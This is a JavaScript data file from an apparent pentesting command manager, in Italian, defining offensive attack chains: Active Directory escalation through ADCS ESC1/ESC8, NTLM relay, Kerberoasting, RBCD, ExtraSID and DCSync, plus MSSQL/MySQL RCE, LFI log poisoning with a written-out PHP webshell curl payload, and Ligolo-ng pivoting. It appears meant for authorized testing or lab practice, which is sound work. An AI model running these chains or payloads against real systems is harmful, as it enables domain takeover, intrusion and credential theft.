/* chains.js — generato da Command Manager il 2026-07-08T13:54:02.513Z */
const CHAINS = [
  {
    "id": "passive-subs",
    "name": "Passive Subdomain Discovery",
    "short": "subs",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "tactic": "Reconnaissance",
    "difficulty": "easy",
    "estTime": "10 min",
    "objective": "Enumerare il massimo dei sottodomini SENZA toccare il target: aggrega più fonti passive, unisci le liste e risolvile per ottenere solo gli host vivi.",
    "outcome": "Lista di sottodomini vivi (host + IP) pronta per la fase active",
    "prereqs": [
      "Solo il dominio root",
      "API key per subfinder/chaos = copertura migliore (opzionale)"
    ],
    "mitre": [
      "T1590.002",
      "T1596.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "CT logs (crt.sh)",
        "cmdRef": "crtsh",
        "rationale": "I certificati pubblici espongono sottodomini, anche dev/staging. Zero traffico al target.",
        "verify": "crtsh.txt non è vuoto."
      },
      {
        "id": "s2",
        "title": "subfinder",
        "cmdRef": "subfinder",
        "rationale": "Aggrega decine di fonti passive oltre ai CT log."
      },
      {
        "id": "s3",
        "title": "amass",
        "cmdRef": "amass-passive",
        "rationale": "Altre fonti ancora: amass trova spesso sub che gli altri perdono."
      },
      {
        "id": "s4",
        "title": "assetfinder",
        "cmdRef": "assetfinder",
        "rationale": "Raccolta veloce extra — più fonti = più copertura."
      },
      {
        "id": "s5",
        "title": "chaos",
        "cmdRef": "chaos",
        "rationale": "Interroga il dataset Chaos di ProjectDiscovery: sottodomini già raccolti da fonti pubbliche. Serve una API key gratuita (PDCP_API_KEY)."
      },
      {
        "id": "s6",
        "title": "theHarvester",
        "cmdRef": "theharvester",
        "cmd": {
          "name": "theHarvester — emails & hosts",
          "description": "Aggrega email, sottodomini, host e nomi da molte fonti pubbliche. `-b all` lancia tutti i moduli (alcuni richiedono API key e danno solo warning). Le email rivelano la naming convention → user list.",
          "template": "theHarvester -d <domain> -b all -l 500 -f harvest",
          "params": [
            {
              "key": "domain",
              "label": "Domain",
              "ctx": "domain",
              "placeholder": "example.com"
            }
          ],
          "variants": [
            {
              "id": "default",
              "label": "Tutte le fonti",
              "template": "theHarvester -d <domain> -b all | tee theharvester.txt",
              "description": "Tutte le fonti con l'output salvato in `theharvester.txt` tramite `tee`: testo greppabile, invece dei file strutturati di `-f`."
            },
            {
              "id": "free",
              "label": "Senza API key",
              "template": "theHarvester -d <domain> -b crtsh,duckduckgo,bing,otx,rapiddns -l 500",
              "description": "Solo fonti senza API key: veloce e zero setup."
            }
          ]
        },
        "variant": "default",
        "rationale": "Estrae host e sottodomini da molte fonti OSINT; la variante tee salva theharvester.txt, così rientra nel merge finale."
      },
      {
        "id": "s7",
        "title": "Unisci e risolvi",
        "cmdRef": "dnsx-resolve",
        "rationale": "cat di tutti i .txt, dedup e risoluzione: tieni solo gli host vivi con record A."
      }
    ]
  },
  {
    "id": "passive-footprint",
    "name": "Passive Domain Footprint",
    "short": "recon",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "tactic": "Reconnaissance",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Costruisci una mappa esterna completa del dominio SENZA inviargli traffico: dati di registrazione, DNS, sottodomini, email e servizi esposti, tutto da fonti terze.",
    "outcome": "Lista sottodomini + host vivi + email/naming convention + porte esposte",
    "prereqs": [
      "Serve solo il dominio root",
      "Le API key (Shodan, fonti subfinder) migliorano la copertura (opzionale)"
    ],
    "mitre": [
      "T1590",
      "T1591",
      "T1596",
      "T1589.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Registrazione e nameserver",
        "cmdRef": "whois-domain",
        "rationale": "Registrar, date e record NS: i nameserver rivelano il provider DNS/hosting."
      },
      {
        "id": "s2",
        "title": "Record DNS",
        "cmdRef": "dig-records",
        "rationale": "MX/TXT rivelano il mail provider, SPF/DKIM e i SaaS usati dall’organizzazione."
      },
      {
        "id": "s3",
        "title": "Sottodomini dai CT logs",
        "cmdRef": "crtsh",
        "rationale": "I Certificate Transparency espongono sottodomini (anche dev/staging) senza traffico al target.",
        "verify": "crtsh.txt non è vuoto."
      },
      {
        "id": "s4",
        "title": "Aggrega altri sottodomini",
        "cmdRef": "subfinder",
        "rationale": "Aggiunge fonti passive oltre ai CT log. Unisci con crt.sh / amass / assetfinder in all_subs.txt."
      },
      {
        "id": "s5",
        "title": "Risolvi agli host vivi",
        "cmdRef": "dnsx-resolve",
        "rationale": "Trasforma la lista unita in record A vivi: diventa la lista target della fase active."
      },
      {
        "id": "s6",
        "title": "Email e naming convention",
        "cmdRef": "theharvester",
        "rationale": "Le email raccolte rivelano il pattern username (n.cognome, nome.cognome…) per lo spraying."
      },
      {
        "id": "s7",
        "title": "Servizi esposti (no touch)",
        "cmdRef": "shodan-host",
        "rationale": "Scegli un IP vivo dallo step 5 (mettilo nel Target). Shodan mostra porte/CVE senza scansionare."
      }
    ]
  },
  {
    "id": "esc1-to-da",
    "name": "ADCS ESC1 → Domain Admin",
    "short": "esc1",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Da un utente di dominio qualsiasi arrivi a Domain Admin abusando di un template di certificato mal configurato (ESC1: client auth, enrollment per utenti poco privilegiati e SAN a piacere).",
    "outcome": "NT hash dell'Administrator o ticket da DA",
    "prereqs": [
      "Credenziali valide di un utente di dominio qualsiasi",
      "Accesso di rete al DC e ad ADCS",
      "Esiste almeno un template vulnerabile"
    ],
    "mitre": [
      "T1649",
      "T1078.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumera i template ADCS vulnerabili",
        "cmdRef": "certipy-find",
        "rationale": "Elenca le CA e segnala i template che permettono client auth, enrollment poco privilegiato e SAN a piacere. Cerca ESC1 nell'output.",
        "verify": "Nel report di certipy compare il tag \"ESC1\"."
      },
      {
        "id": "s2",
        "title": "Richiedi il certificato di impersonazione",
        "cmdRef": "certipy-req",
        "overrides": {
          "upn": "administrator@<domain>"
        },
        "rationale": "Imposti SAN UPN=administrator e la CA emette un certificato per l'identità DA.",
        "verify": "`Got certificate with UPN administrator@…`"
      },
      {
        "id": "s3",
        "title": "PKINIT: TGT e NT hash",
        "cmdRef": "certipy-auth",
        "rationale": "Ti autentichi come Administrator con il certificato. Certipy ricava anche l'NT hash via U2U.",
        "verify": "`Got hash for administrator@…`"
      },
      {
        "id": "s4",
        "title": "Conferma DA con DCSync",
        "cmdRef": "secretsdump",
        "overrides": {
          "user": "administrator",
          "password": ":<hash>"
        },
        "rationale": "Replichi il krbtgt per provare l'accesso da DA e lo salvi per i Golden Ticket futuri."
      }
    ]
  },
  {
    "id": "coerce-relay-adcs",
    "name": "Coerce + Relay → ADCS (ESC8)",
    "short": "esc8",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Initial Access → DA",
    "difficulty": "hard",
    "estTime": "20 min",
    "objective": "Da una posizione in rete senza credenziali: forzi il DC ad autenticarsi in NTLM e rilanci l'auth verso ADCS Web Enrollment per emettere un certificato del DC.",
    "outcome": "TGT del DC$ per il DCSync",
    "prereqs": [
      "Raggiungibilità L3 verso il DC e verso ADCS HTTP",
      "ADCS Web Enrollment attivo e senza Channel Binding"
    ],
    "mitre": [
      "T1187",
      "T1557.001",
      "T1649"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma l'esposizione a ESC8",
        "cmdRef": "certipy-find",
        "rationale": "Verifica che il WebEnrollment sia raggiungibile e che il template `DomainController` sia richiedibile dai Domain Computers."
      },
      {
        "id": "s2",
        "title": "Avvia ntlmrelayx verso /certsrv",
        "cmdRef": "ntlmrelayx-adcs",
        "rationale": "Lascialo in ascolto: a relay riuscito registra un PFX in Base64 per l'account rilanciato."
      },
      {
        "id": "s3",
        "title": "Forza il DC ad autenticarsi",
        "cmdRef": "coercer",
        "rationale": "PetitPotam / MS-RPRN / DFSCoerce costringono il `DC$` ad autenticarsi verso il tuo listener.",
        "verify": "`Authenticating against http://… as CORP/DC01$ SUCCEED`"
      },
      {
        "id": "s4",
        "title": "Converti il certificato in TGT per il DC$",
        "cmdRef": "certipy-auth",
        "rationale": "PKINIT con il certificato del `DC$` restituisce un TGT e l'NT hash del `DC$`."
      },
      {
        "id": "s5",
        "title": "DCSync come DC$",
        "cmdRef": "secretsdump",
        "overrides": {
          "user": "DC01$",
          "password": ""
        },
        "rationale": "Gli account computer dei DC hanno i diritti di replica: estrai il krbtgt e hai chiuso."
      }
    ]
  },
  {
    "id": "asrep-kerb-dcsync",
    "name": "AS-REP → Kerberoast → DCSync",
    "short": "offline",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30 min + crack",
    "objective": "Escalation tutta offline: raccogli gli hash AS-REP, ne cracki uno, poi fai Kerberoast e arrivi al DCSync.",
    "outcome": "Dump dell'NTDS",
    "prereqs": [
      "LDAP visibile (anonymous o guest)"
    ],
    "mitre": [
      "T1558.004",
      "T1558.003",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Enumera gli utenti di dominio validi",
        "cmdRef": "kerbrute-userenum"
      },
      {
        "id": "s2",
        "title": "AS-REP roast degli account senza pre-auth",
        "cmdRef": "getnpusers",
        "rationale": "Gli account con DONT_REQ_PREAUTH espongono un AS-REP cifrato con la chiave dell'utente, crackabile offline."
      },
      {
        "id": "s3",
        "title": "Cracka l'AS-REP (hashcat 18200)",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "18200"
        },
        "rationale": "Mode 18200 per l'AS-REP. Basta una password craccata per il passo dopo."
      },
      {
        "id": "s4",
        "title": "Kerberoast degli account con SPN",
        "cmdRef": "getuserspns",
        "rationale": "Autenticato come l'utente craccato, richiedi i TGS di ogni SPN."
      },
      {
        "id": "s5",
        "title": "Cracka e trova un account con diritti DCSync",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "13100"
        }
      },
      {
        "id": "s6",
        "title": "DCSync",
        "cmdRef": "secretsdump",
        "rationale": "Lancialo con l'account privilegiato trovato."
      }
    ]
  },
  {
    "id": "rbcd-takeover",
    "name": "RBCD Takeover",
    "short": "rbcd",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "10 min",
    "objective": "Prendi il controllo di un computer tramite Resource-Based Constrained Delegation: scrivi AllowedToActOnBehalfOfOtherIdentity, poi S4U2Self+Proxy fino a una shell SYSTEM.",
    "outcome": "Shell SYSTEM sulla vittima",
    "prereqs": [
      "GenericWrite/WriteDACL sull'oggetto computer della vittima",
      "MachineAccountQuota > 0 (default 10), oppure un computer che già controlli"
    ],
    "mitre": [
      "T1134.001",
      "T1550.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma l'ACL con BloodHound",
        "cmdRef": "bloodhound-py",
        "rationale": "Lancia una query sull'edge AddAllowedToAct per confermare il percorso."
      },
      {
        "id": "s2",
        "title": "Crea un computer account che controlli",
        "cmdRef": "addcomputer",
        "rationale": "Consuma uno slot del MAQ per avere un SPN sotto il tuo controllo."
      },
      {
        "id": "s3",
        "title": "Scrivi msDS-AllowedToActOnBehalfOfOtherIdentity",
        "cmdRef": "rbcd-write",
        "verify": "`Delegation rights modified successfully!`"
      },
      {
        "id": "s4",
        "title": "S4U2Self + S4U2Proxy come Administrator",
        "cmdRef": "getst-s4u",
        "overrides": {
          "impersonate": "administrator"
        },
        "rationale": "Forgia un TGS per cifs/<victim>.<domain> come Administrator."
      },
      {
        "id": "s5",
        "title": "PSExec con il ticket",
        "cmdRef": "psexec",
        "overrides": {
          "ip": "<victim>.<domain>",
          "user": "administrator",
          "password": ""
        },
        "rationale": "Usa `-k -no-pass` con KRB5CCNAME che punta al ccache."
      }
    ]
  },
  {
    "id": "mssql-rce",
    "name": "MSSQL → RCE",
    "short": "mssql",
    "category": "service-enum",
    "subcategory": "mssql",
    "tactic": "Exploitation",
    "difficulty": "easy",
    "estTime": "10 min",
    "objective": "Escalation MSSQL standard: login → verifica sysadmin → xp_cmdshell. Se non sei sysadmin, prova IMPERSONATE.",
    "outcome": "RCE come account del servizio SQL",
    "prereqs": [
      "Credenziali MSSQL valide"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Connessione",
        "cmdRef": "mssql-login"
      },
      {
        "id": "s2",
        "title": "Verifica ruolo",
        "cmdRef": "mssql-roles",
        "rationale": "`SELECT IS_SRVROLEMEMBER('sysadmin')`: torna `1` = sei sysadmin, vai a xp_cmdshell (s3); `0` = non sysadmin, passa all'impersonation (s4) e prima enumera i login impersonabili (variante 'Chi posso impersonare')."
      },
      {
        "id": "s3",
        "title": "xp_cmdshell RCE (via sysadmin)",
        "cmdRef": "mssql-xpcmdshell",
        "overrides": {
          "cmd": "whoami"
        }
      },
      {
        "id": "s4",
        "title": "Oppure: impersona sa (senza sysadmin)",
        "cmdRef": "mssql-impersonate",
        "rationale": "Se non sei sysadmin: SELECT dei permessi IMPERSONATE, poi EXECUTE AS LOGIN."
      }
    ]
  },
  {
    "id": "mysql-rce",
    "name": "MySQL → RCE",
    "short": "mysql",
    "category": "service-enum",
    "subcategory": "mysql",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "15 min",
    "objective": "Da credenziali MySQL a esecuzione comandi. MySQL non ha un xp_cmdshell pronto: prima verifica FILE privilege e secure_file_priv, poi scegli la via (webshell OUTFILE o UDF).",
    "outcome": "Comando OS come utente del servizio mysqld",
    "prereqs": [
      "Credenziali MySQL valide"
    ],
    "mitre": [
      "T1190",
      "T1059"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Connessione",
        "cmdRef": "mysql-login"
      },
      {
        "id": "s2",
        "title": "Verifica prerequisiti RCE",
        "cmdRef": "mysql-privcheck",
        "rationale": "Serve `FILE` privilege e `secure_file_priv` diverso da `NULL`. Se `secure_file_priv` è `NULL`, questa via è morta: cerca un altro vettore (exploit app, credential reuse)."
      },
      {
        "id": "s3",
        "title": "RCE",
        "cmdRef": "mysql-oscmd",
        "variant": "outfile",
        "rationale": "Se conosci il webroot ed è scrivibile: scrivi la webshell, poi RCE via HTTP (`sh.php?cmd=id`)."
      }
    ]
  },
  {
    "id": "lfi-to-rce",
    "name": "LFI → Log Poisoning → RCE",
    "short": "lfi",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "tactic": "Exploitation",
    "difficulty": "medium",
    "estTime": "20 min",
    "objective": "Trasforma una Local File Inclusion in esecuzione di codice avvelenando un log con PHP e poi includendolo.",
    "outcome": "RCE come utente del web server",
    "prereqs": [
      "Parametro vulnerabile a LFI",
      "Accesso in lettura a un log (Apache/Nginx/auth)"
    ],
    "mitre": [
      "T1190",
      "T1505.003"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma la LFI",
        "cmdRef": "lfi",
        "rationale": "Leggi `/etc/passwd` per confermare il path traversal e capire la profondità."
      },
      {
        "id": "s2",
        "title": "Inietta PHP nel log (User-Agent)",
        "cmdRef": "lfi-logpoison",
        "cmd": {
          "name": "LFI — log poisoning → RCE",
          "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
          "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
          "params": [
            {
              "key": "ip",
              "label": "Target",
              "ctx": "ip",
              "placeholder": "10.10.10.11"
            }
          ],
          "variants": [
            {
              "id": "default",
              "label": "1. Inietta nel log & esegui",
              "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
              "description": "Scrive il payload PHP nello `User-Agent`: finisce nell’`access.log`."
            }
          ]
        },
        "variant": "default",
        "rationale": "Il payload nello User-Agent finisce nell’access.log del web server."
      },
      {
        "id": "s3",
        "title": "Includi il log ed esegui",
        "cmdRef": "lfi-logpoison",
        "cmd": {
          "name": "LFI — log poisoning → RCE",
          "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
          "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
          "params": [
            {
              "key": "ip",
              "label": "Target",
              "ctx": "ip",
              "placeholder": "10.10.10.11"
            }
          ],
          "variants": [
            {
              "id": "default",
              "label": "1. Inietta nel log",
              "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
              "description": "Scrive il payload PHP nello `User-Agent`: finisce nell’`access.log`."
            },
            {
              "id": "trigger",
              "label": "2. Esegui",
              "template": "http://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
              "description": "LFI sul log: il PHP iniettato viene eseguito, cmd= passa il comando."
            }
          ]
        },
        "variant": "trigger",
        "rationale": "Includendo il log via LFI, il PHP iniettato viene eseguito; `cmd=` passa il comando."
      }
    ]
  },
  {
    "id": "kerberoast-crack",
    "name": "Kerberoast → Crack → Lateral",
    "short": "kerb",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "30 min",
    "objective": "Richiedi i TGS degli account con SPN, crackali offline e riusa la password trovata per muoverti.",
    "outcome": "Password di un service account (spesso privilegiato)",
    "prereqs": [
      "Credenziali di dominio valide"
    ],
    "mitre": [
      "T1558.003",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Richiedi i TGS (Kerberoast)",
        "cmdRef": "getuserspns",
        "rationale": "Salva gli hash in `kerb.txt`; i service account hanno spesso password deboli."
      },
      {
        "id": "s2",
        "title": "Cracka offline",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "13100",
          "hashfile": "kerb.txt"
        },
        "rationale": "Mode `13100` = TGS Kerberoast."
      },
      {
        "id": "s3",
        "title": "Riusa le credenziali",
        "cmdRef": "psexec",
        "rationale": "Prova la password sui servizi (SMB/WinRM): se il service account è admin da qualche parte, è game over."
      }
    ]
  },
  {
    "id": "responder-relay",
    "name": "Responder → NTLM Relay → Shell",
    "short": "relay",
    "category": "active-directory",
    "subcategory": "initial-access",
    "tactic": "Credential Access",
    "difficulty": "medium",
    "estTime": "25 min",
    "objective": "Cattura NetNTLMv2 avvelenando LLMNR/NBT-NS; crackalo, oppure rilancialo (relay) verso host senza SMB signing per una shell.",
    "outcome": "Hash NetNTLMv2 o shell su un host senza signing",
    "prereqs": [
      "Posizione in rete (stesso segmento delle vittime)"
    ],
    "mitre": [
      "T1557.001",
      "T1212"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Trova i target senza SMB signing",
        "rationale": "Genera la lista relay: `nxc smb <range> --gen-relay-list targets.txt` (signing:False)."
      },
      {
        "id": "s2",
        "title": "Avvelena e cattura",
        "cmdRef": "responder",
        "variant": "default",
        "rationale": "Cattura i NetNTLMv2 di chi cerca host inesistenti."
      },
      {
        "id": "s3",
        "title": "Oppure rilancia (relay)",
        "cmdRef": "ntlmrelayx-smb",
        "variant": "default",
        "rationale": "Disabilita SMB/HTTP in `Responder.conf`, poi relaya verso i target senza signing per una shell o un dump SAM."
      }
    ]
  },
  {
    "id": "child-to-parent-extrasid",
    "name": "Child → Parent (ExtraSID)",
    "short": "extrasid",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "hard",
    "estTime": "20 min",
    "objective": "Da un child domain compromesso sali all'intero forest: forgia un Golden Ticket del child con il SID degli Enterprise Admins del parent iniettato come ExtraSID.",
    "outcome": "Enterprise Admin sul parent domain",
    "prereqs": [
      "DA (o hash krbtgt) sul child domain",
      "SID del child e degli Enterprise Admins del parent"
    ],
    "mitre": [
      "T1134.005",
      "T1558.001"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Dump del krbtgt del child",
        "cmdRef": "dcsync",
        "rationale": "Con i diritti di replica sul child estrai l'hash del `krbtgt` (`-just-dc-user krbtgt`): è la chiave per forgiare ticket nel child."
      },
      {
        "id": "s2",
        "title": "Forgia il Golden Ticket con ExtraSID",
        "cmdRef": "trust-extrasid",
        "rationale": "Ti servono il SID del child e quello degli Enterprise Admins del parent (`<parentsid>-519`, da `impacket-lookupsid`). Inietti il `-519` come ExtraSID: il KDC del parent lo accetta come Enterprise Admin."
      },
      {
        "id": "s3",
        "title": "Accedi al parent DC",
        "cmdRef": "psexec",
        "rationale": "Usa il ticket (`export KRB5CCNAME=...` e `-k -no-pass`) per una shell sul DC del parent. Shortcut: `impacket-raiseChild` fa tutti i passi in uno."
      }
    ]
  },
  {
    "id": "unconstrained-to-dcsync",
    "name": "Unconstrained → Coerce → DCSync",
    "short": "unconstrained",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "hard",
    "estTime": "15 min",
    "objective": "Con SYSTEM su una macchina con unconstrained delegation forzi il DC ad autenticarsi verso di te, ne catturi il TGT e con quello fai DCSync.",
    "outcome": "Hash del dominio (DCSync)",
    "prereqs": [
      "SYSTEM su una macchina con unconstrained delegation",
      "Il DC deve poterti raggiungere (coercion)"
    ],
    "mitre": [
      "T1187",
      "T1558",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Monitora i TGT in arrivo",
        "cmdRef": "unconstrained-deleg",
        "rationale": "Sulla macchina compromessa avvii il monitor (`Rubeus monitor`): ogni TGT che arriva viene catturato."
      },
      {
        "id": "s2",
        "title": "Forza il DC ad autenticarsi",
        "cmdRef": "coercer",
        "rationale": "PetitPotam o PrinterBug costringono il `DC$` ad autenticarsi verso di te: il suo TGT finisce nel monitor."
      },
      {
        "id": "s3",
        "title": "Inietta il TGT del DC$ e fai DCSync",
        "cmdRef": "dcsync",
        "rationale": "Con `Rubeus ptt` inietti il TGT del `DC$` in memoria, poi replichi gli hash del dominio: il `DC$` ha i diritti di replica."
      }
    ]
  },
  {
    "id": "acl-path-to-da",
    "name": "Foothold → BloodHound → ACL → DA",
    "short": "aclpath",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "tactic": "Privilege Escalation",
    "difficulty": "medium",
    "estTime": "30 min",
    "objective": "Dal primo accesso al dominio arrivi a Domain Admin seguendo un attack path di ACL: mappi con BloodHound, abusi i diritti lungo il percorso e chiudi con DCSync.",
    "outcome": "Hash del dominio (DCSync)",
    "prereqs": [
      "Credenziali di un utente di dominio qualsiasi"
    ],
    "mitre": [
      "T1087.002",
      "T1222.001",
      "T1003.006"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Mappa il dominio con BloodHound",
        "cmdRef": "bloodhound-py",
        "rationale": "Raccogli tutti gli edge e cerca `Shortest Path to Domain Admin` e i diritti ACL sfruttabili dal tuo utente."
      },
      {
        "id": "s2",
        "title": "Abusa l'ACL lungo il path",
        "cmdRef": "acl-abuse",
        "rationale": "ForceChangePassword, GenericWrite o AddMember per prendere il controllo dell'account successivo sul percorso."
      },
      {
        "id": "s3",
        "title": "Concediti i diritti di replica",
        "cmdRef": "writedacl-dcsync",
        "rationale": "Se il path arriva a `WriteDACL` sul dominio, aggiungi i diritti DCSync al tuo account."
      },
      {
        "id": "s4",
        "title": "DCSync e cleanup",
        "cmdRef": "dcsync",
        "rationale": "Estrai gli hash del dominio, poi rimuovi i diritti aggiunti per pulire."
      }
    ]
  },
  {
    "id": "sqli-to-creds",
    "name": "SQLi → Dump → Login",
    "short": "sqli",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "tactic": "Credential Access",
    "difficulty": "easy",
    "estTime": "20 min",
    "objective": "Da un’iniezione SQL estrai le credenziali applicative, crackale se hashate e riusale per autenticarti.",
    "outcome": "Credenziali valide dall’applicazione",
    "prereqs": [
      "Parametro iniettabile (SQLi)"
    ],
    "mitre": [
      "T1190",
      "T1110.002"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Conferma l’iniezione",
        "cmdRef": "sqli-detect",
        "rationale": "Boolean o time-based per confermare prima di automatizzare."
      },
      {
        "id": "s2",
        "title": "Enumera i database",
        "cmdRef": "sqlmap",
        "variant": "default"
      },
      {
        "id": "s3",
        "title": "Dumpa la tabella utenti",
        "cmdRef": "sqlmap",
        "variant": "dump"
      },
      {
        "id": "s4",
        "title": "Cracka se hashate, poi riusa",
        "cmdRef": "hashcat-ntlm",
        "overrides": {
          "mode": "0"
        },
        "rationale": "Identifica il tipo di hash (es. `0` MD5) e crackalo; poi riusa le credenziali su login/SSH/SMB."
      }
    ]
  },
  {
    "id": "ligolo-pivot",
    "name": "Pivoting con Ligolo-ng",
    "short": "ligolo",
    "category": "lateral",
    "subcategory": "pivoting",
    "tactic": "Lateral Movement",
    "difficulty": "medium",
    "estTime": "10 min",
    "objective": "Pivotare in una rete interna con Ligolo-ng: interfaccia tun sull'attacker, agent sul ponte, aggiungi una route e raggiungi la subnet interna con i tool Kali normali, senza proxychains.",
    "outcome": "Subnet interna raggiungibile direttamente dalla Kali",
    "prereqs": [
      "Shell sulla macchina ponte (dual-homed)",
      "Binari ligolo: proxy (attacker) e agent (target), da github.com/nicocha30/ligolo-ng"
    ],
    "mitre": [
      "T1090",
      "T1572"
    ],
    "steps": [
      {
        "id": "s1",
        "title": "Crea l'interfaccia TUN (Kali)",
        "cmd": {
          "name": "Ligolo — interfaccia TUN",
          "description": "Il primo passo è creare l'interfaccia TUN con questi comandi. Per visualizzare la nuova interfaccia `ligolo` basta un `ifconfig`.",
          "template": "sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up",
          "params": []
        }
      },
      {
        "id": "s2",
        "title": "Scarica e invia l'agent al ponte",
        "cmd": {
          "name": "scp — invia l'agent",
          "description": "Scarica l'agent adatto al sistema che farà da ponte (dalle release GitHub). Dopodiché lo invii al target ponte tramite `scp`, se hai una connessione SSH.",
          "template": "scp <agent> <user>@<pivot>:/tmp",
          "params": [
            { "key": "agent", "label": "Path agent", "placeholder": "./agent" },
            { "key": "user", "label": "User ponte", "ctx": "user", "placeholder": "jbetty" },
            { "key": "pivot", "label": "IP ponte", "ctx": "ip", "placeholder": "10.129.170.173" }
          ]
        }
      },
      {
        "id": "s3",
        "title": "Avvia proxy (Kali) e agent (ponte)",
        "cmd": {
          "name": "Ligolo — proxy + agent",
          "description": "Su Kali avvii `ligolo-proxy` con certificati autofirmati; sulla macchina ponte avvii l'agent, che si connette al proxy. Una volta connessi all'agente, il comando `help` mostra cosa puoi fare.",
          "template": "# Su Kali (proxy) con certificati autofirmati:\nligolo-ng -selfcert\n\n# Sul ponte (agent), 11601 è la porta di default; in VPN usa l'IP della VPN:\n./agent -connect <ip_attacker>:11601 -ignore-cert",
          "params": [
            { "key": "ip_attacker", "label": "IP attacker", "ctx": "ip", "placeholder": "10.10.14.5" }
          ]
        }
      },
      {
        "id": "s4",
        "title": "Seleziona la sessione",
        "cmd": {
          "name": "Ligolo — session",
          "description": "Prima di interagire con la rete interna imposta il tunnel: esegui `session` e seleziona l'id della sessione con cui interagire; poi `ifconfig` per verificare le connessioni di rete sull'agente connesso (annota la subnet interna).",
          "template": "session\nifconfig",
          "params": []
        }
      },
      {
        "id": "s5",
        "title": "Aggiungi la route e start",
        "cmd": {
          "name": "Ligolo — route + start",
          "description": "Aggiungi una voce alla tabella di routing così Ligolo instrada il traffico nel tunnel verso la rete di destinazione, poi dalla console digiti `start`. Ora puoi eseguire qualsiasi strumento da Kali per interagire con la rete interna, come se fossi connesso direttamente.",
          "template": "# <internal_net> nel formato x.x.x.x/xx (es. 172.16.119.0/24):\nsudo ip route add <internal_net> dev ligolo\n\n# poi nella console ligolo-ng:\nstart",
          "params": [
            { "key": "internal_net", "label": "Rete interna", "placeholder": "172.16.119.0/24" }
          ]
        }
      }
    ]
  }
];
window.CHAINS = CHAINS;
